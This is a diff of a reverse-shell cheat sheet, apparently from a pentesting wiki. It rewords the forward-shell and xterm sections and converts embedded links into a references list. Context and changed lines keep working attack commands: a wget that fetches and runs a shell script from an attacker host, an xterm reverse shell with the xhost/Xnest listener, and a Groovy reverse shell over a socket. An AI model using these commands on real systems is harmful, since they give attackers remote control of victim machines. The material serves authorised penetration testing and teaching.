@@ -73,7 +73,8 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 
 ## Forward Shell
 
-You might find cases where you have an **RCE in a web app in a Linux machine** but due to Iptables rules or other kinds of filtering **you cannot get a reverse shell**. This "shell" allows you to maintain a PTY shell through that RCE using pipes inside the victim system.\
+If you encounter an **RCE vulnerability** within a Linux-based web application, there might be instances where **obtaining a reverse shell becomes difficult** due to the presence of Iptables rules or other filters. In such scenarios, consider creating a PTY shell within the compromised system using pipes.
+
 You can find the code in [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)
 
 You just need to modify:
@@ -337,22 +338,19 @@ BEGIN {
 
 ## Xterm
 
-One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001.
+This will try to connect to your system at port 6001:
 
 ```bash
 xterm -display 10.0.0.1:1
 ```
 
-To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001). One way to do this is with Xnest (to be run on your system):
+To catch the reverse shell you can use (which will listen in port 6001):
 
 ```bash
-Xnest :1
-```
-
-You’ll need to authorise the target to connect to you (command also run on your host):
-
-```bash
+# Authorize host
 xhost +targetip
+# Listen
+Xnest :1
 ```
 
 ## Groovy
@@ -366,15 +364,12 @@ String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
 
-## Bibliography
+## References
+* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
+* [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
+* [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
+* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
-{% embed url="https://highon.coffee/blog/reverse-shell-cheat-sheet/" %}
-
-{% embed url="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell" %}
-
-{% embed url="https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/" %}
-
-{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" %}
 
 <figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
